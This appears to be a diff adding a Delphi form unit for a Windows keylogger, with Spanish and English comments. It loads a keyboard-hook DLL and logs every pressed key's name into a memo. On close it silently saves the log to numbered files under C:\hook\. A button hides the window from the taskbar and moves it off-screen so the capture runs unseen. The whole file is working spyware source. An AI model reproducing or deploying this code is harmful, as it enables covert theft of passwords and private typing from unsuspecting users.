@@ -1,0 +1,174 @@
+unit Unit1;
+ 
+interface 
+ 
+uses 
+  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
+  StdCtrls;
+ 
+const 
+  NombreDLL       = 'HookTeclado.dll';
+  CM_MANDA_TECLA  = WM_USER + $1000;
+ 
+ 
+type 
+  THookTeclado=procedure; stdcall;
+ 
+type 
+  TForm1 = class(TForm)
+    Memo1: TMemo;
+    Button1: TButton;
+    SaveDialog1: TSaveDialog;
+    Button2: TButton;
+    procedure FormCreate(Sender: TObject);
+    procedure FormDestroy(Sender: TObject);
+    procedure Button1Click(Sender: TObject);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+    procedure Button2Click(Sender: TObject);
+  private
+    { Private declarations }
+    FicheroM       : THandle;
+    PReceptor      : ^Integer;
+    HandleDLL      : THandle;
+    HookOn,
+    HookOff        : THookTeclado;
+ 
+    procedure LlegaDelHook(var message: TMessage); message  CM_MANDA_TECLA;
+  public
+    { Public declarations }
+  end; 
+ 
+var 
+  Form1: TForm1;
+ 
+implementation 
+ 
+{$R *.DFM}
+ 
+procedure TForm1.FormCreate(Sender: TObject);
+begin
+  {No queremos que el Memo maneje el teclado...}
+  {We dont want that the memo read the keyboard...}
+  Memo1.ReadOnly:=TRUE;
+ 
+  HandleDLL:=LoadLibrary( PChar(ExtractFilePath(Application.Exename)+
+                                NombreDLL ) );
+  if HandleDLL = 0 then raise Exception.Create('No se pudo cargar la DLL');
+ 
+  @HookOn :=GetProcAddress(HandleDLL, 'HookOn');
+  @HookOff:=GetProcAddress(HandleDLL, 'HookOff');
+ 
+  if not assigned(HookOn) or 
+     not assigned(HookOff)  then 
+     raise Exception.Create('No se encontraron las funciones en la DLL'+#13+
+                            'Cannot find the required DLL functions');
+ 
+  {Creamos el fichero de memoria}
+  FicheroM:=CreateFileMapping( $FFFFFFFF,
+                              nil,
+                              PAGE_READWRITE,
+                              0,
+                              SizeOf(Integer),
+                              'ElReceptor');
+ 
+   {Si no se creó el fichero, error}
+   if FicheroM=0 then 
+     raise Exception.Create( 'Error al crear el fichero'+
+                             '/Error while create file');
+ 
+   {Direccionamos nuestra estructura al fichero de memoria}
+   PReceptor:=MapViewOfFile(FicheroM,FILE_MAP_WRITE,0,0,0);
+ 
+   {Escribimos datos en el fichero de memoria}
+   PReceptor^:=Handle;
+   HookOn;
+end; 
+ 
+procedure TForm1.LlegaDelHook(var message: TMessage);
+var 
+   NombreTecla : array[0..100] of char;
+   Accion      : string;
+begin 
+  {Traducimos de Virtual key Code a TEXTO}
+  {Virtual key code to Key Name}
+  GetKeyNameText(Message.LParam,@NombreTecla,100);
+ 
+  {Miramos si la tecla fué pulsada, soltada o repetida}
+  {Look if the key was pressed, released o re-pressed}
+  if ((Message.lParam shr 31) and 1)=1
+      then Accion:='Soltada' {Released}
+  else 
+  if ((Message.lParam shr 30) and 1)=1
+      then Accion:='Repetida' {repressed}
+      else Accion:='Pulsada'; {pressed}
+ 
+{  Memo1.Lines.Append( Accion+
+                      ' tecla: '+
+                      String(NombreTecla) );}
+   if Accion='Pulsada' then
+      Memo1.Lines.Append(String(NombreTecla) );
+end;
+ 
+procedure TForm1.FormDestroy(Sender: TObject);
+begin 
+ {Desactivamos el Hook}
+ {Uninstall the Hook}
+ if Assigned(HookOff) then HookOff;
+ 
+ {Liberamos la DLL}
+ {Free the DLL}
+ if HandleDLL<>0 then 
+  FreeLibrary(HandleDLL);
+ 
+ {Cerramos la vista del fichero y el fichero}
+ {Close the memfile and the View}
+ if FicheroM<>0 then 
+ begin 
+   UnmapViewOfFile(PReceptor);
+   CloseHandle(FicheroM);
+ end; 
+ 
+end; 
+ 
+procedure TForm1.Button1Click(Sender: TObject);
+  var archivotxt: TextFile;
+     Ruta:String;
+     i:Integer;
+begin
+{   if SaveDialog1.Execute then
+   begin
+      ruta:=SaveDialog1.FileName+'.txt';
+      AssignFile(archivotxt,Ruta);
+      Rewrite(archivotxt);
+      Writeln(archivotxt,memo1.text);
+      CloseFile(archivotxt);
+   end;}
+   for i:=1 to 50 do
+   begin
+      Ruta:='C:\hook\'+IntToStr(i)+'.txt';
+      if FileExists(Ruta)=false then
+      begin
+         AssignFile(archivotxt,Ruta);
+         Rewrite(archivotxt);
+         Writeln(archivotxt,memo1.text);
+         CloseFile(archivotxt);
+         Break;
+      end;
+   end;
+
+
+end;
+
+procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+   Button1Click(sender);
+end;
+
+procedure TForm1.Button2Click(Sender: TObject);
+begin
+   ShowWindow(Application.Handle, SW_HIDE);
+   Left:=-1000;
+end;
+
+end.
+
